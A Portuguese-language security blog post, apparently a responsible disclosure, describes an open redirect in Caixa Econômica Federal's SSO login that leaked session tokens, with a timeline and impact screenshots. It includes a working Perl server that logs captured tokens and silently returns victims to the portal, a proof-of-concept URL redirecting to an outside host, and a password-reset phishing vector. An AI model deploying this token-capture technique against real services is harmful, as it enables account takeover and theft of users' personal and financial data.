---
layout: content
title: 'Explorando um Open Redirect para Vazamento de Session Tokens'
description: ''
og_image: https://heitorgouvea.me/images/publications/caixa-account-takeover/email-poc.png
---

Tabela de conteúdo:
- [Sumário](#sumário)
- [As vulnerabilidades](#descrição)
- [Prova de Conceito](#prova-de-conceito)
- [Impacto](#impacto)
- [Conclusão](#conclusão)
- [Referências](#referências)

---

### Sumário

Esta publicação tem como objetivo compartilhar uma vulnerabilidade de Open Redirect[[1]](#referências) encontrada no site da Caixa Econômica Federal, por meio da qual foi possível expor Tokens de Sessão de usuários.

É importante esclarecer que durante todos os testes, a única conta utilizada foi aquela cujo titular havia autorizado o uso. Nenhuma outra conta ou informação de terceiros foi acessada ou violada no decorrer desta pesquisa e da prova de conceito.

Linha do tempo:

```plaintext
01/01/2020: Descoberta da vulnerabilidade e criação da prova de conceito;
01/05/2020: Vulnerabilidade reportada;
01/07/2020: Confirmação pela Caixa Econômica Federal;
01/10/2020: Correção aplicada;
01/10/2020: Divulgação deste artigo técnico;
```

* Esta publicação também está dispoível em: [Espanhol](/2020/01/03/Obteniendo-un-Session-Token-Leak) e [Inglês](/2020/01/03/From-Open-Redirect-to-Session-Token-Leak);

---

### As vulnerabilidades

Durante a navegação pelas páginas web dos sistemas da Caixa Federal, foi identificada uma tela de autenticação que solicitava credenciais de acesso, identificadores como CPF, NIS, e-mail e uma senha. A página em questão é a tela de login para o painel do Portal Cidadão.

![Caixa Federal Home Page Website](/images/publications/caixa-account-takeover/home-page.png)

A URL:

- [http://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://acessoseguro.sso.caixa.gov.br]()

O último parâmetro da URL, `&redirect_uri=`, apresenta uma possível vulnerabilidade de Open Redirect. Esse valor define para onde o usuário será redirecionado após o login.

Para validar essa vulnerabilidade, o parâmetro `&redirect_uri=` foi alterado para apontar para a página inicial do Google. Após o preenchimento das credenciais válidas e realizar o login, o resultado obtido foi:

- <iframe width="100%" height="523" src="https://www.youtube.com/embed/d6EXPMQPcZw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

Como demonstrado, a aplicação é vulnerável a Open Redirect. Contudo, um detalhe adicional foi observado: durante o redirecionamento, um parâmetro extra é incluído:

- [https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)

Após a análise do parâmetro `?code=` e da requisição original, foi possível confirmar que o seu valor corresponde a um Token de Sessão[2].

Essa descoberta evidencia a alta criticidade da falha. Um atacante poderia redirecionar a vítima para uma URL sob seu controle, capturar o token de sessão e, com isso, obter acesso à conta do usuário, violando a confidencialidade e integridade de seus dados.

---

### Prova de conceito

Para comprovar a possibilidade de vazamento e captura do token, o código a seguir foi utilizado:

```perl
#!/usr/bin/env perl
# perl catcher.pl daemon -m production -l http://\*:8080

use 5.030;
use strict;
use warnings;
use Mojolicious::Lite -signatures;

get "/" => sub ($catcher) {
    $catcher -> res -> headers -> header("Access-Control-Allow-Origin" => "*");

    my $code = $catcher -> param("code");

    open (my $logs, ">>", "catcher.logs");
    print $logs "[+] - New Session Token -> '$code' has been catch.\n";
    close ($logs);

    return ($catcher -> render (
        text => "
            <script>window.location='https://acessoseguro.sso.caixa.gov.br/portal/login/?code=$code'</script>
        "
    ));

};

app -> start();
```

Este código captura e armazena tokens de sessão enviados para uma URL controlada pelo atacante. Após a captura, o usuário é redirecionado de volta ao portal oficial, obtendo uma sessão legítima — o que dificulta a percepção de que se trata de um golpe.

A URL da PoC (Proof of Concept) fica assim:

- [https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)

O resultado pode ser visualizado neste vídeo:

- <iframe width="100%" height="523" src="https://www.youtube.com/embed/l2ZpggLSz_o" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

A superfície de ataque ainda é limitada, pois requer que a vítima acesse a URL maliciosa (geralmente por meio de phishing ou engenharia social).

Além disso, descobriu-se que o parâmetro &redirect_uri= também é utilizado no e-mail de redefinição de senha. Ao solicitar uma nova senha, basta preencher o e-mail ou CPF da vítima. O link enviado ao e-mail incluirá o valor malicioso injetado.

Exemplo do e-mail::

![Caixa Federal Email Forgot Password](/images/publications/caixa-account-takeover/email-poc.png)

Mesmo sendo enviado por um sistema legítimo da Caixa Federal, o link contém a URL sob controle do atacante. Ao acessar e redefinir a senha, o redirecionamento ocorre normalmente, resultando no vazamento do Token de Sessão.

Esse vetor de ataque pode ser explorado em larga escala, exigindo apenas o CPF da vítima.

---

### Impacto

Se explorada, essa vulnerabilidade permitiria a visualização de informações confidenciais do usuário, como:

![Caixa Federal Confidential Data User](/images/publications/caixa-account-takeover/confidential-data-user.png)

- Nome completo, CPF, data e hora do último acesso.

![Caixa Federal Confidential Data FGTS](/images/publications/caixa-account-takeover/confidential-data-fgts.png)

- Nome completo, número do PIS, empresa contratante, número da carteira de trabalho, conta do FGTS, data de admissão, saldo da conta e valores depositados mês a mês.

![Caixa Federal Confidential User Andress](/images/publications/caixa-account-takeover/confidential-user-andress.png)

- Endereço completo do usuário (inclusive editável, pois não há necessidade de senha para alteração).

---

### Conclusão

Um atacante poderia explorar as vulnerabilidadesdescritas para comprometer a confidencialidade de contas legítimas de usuários da Caixa Econômica Federal. 

Foi aconselhado à instituição a realização de uma investigação para identificar se tais vulnerabilidades já estavam sendo exploradas por agentes maliciosos em ataques reais.

---

### Referências

- [1] [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [2] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [3] [https://www.owasp.org/index.php/Session_hijacking_attack](https://www.owasp.org/index.php/Session_hijacking_attack)
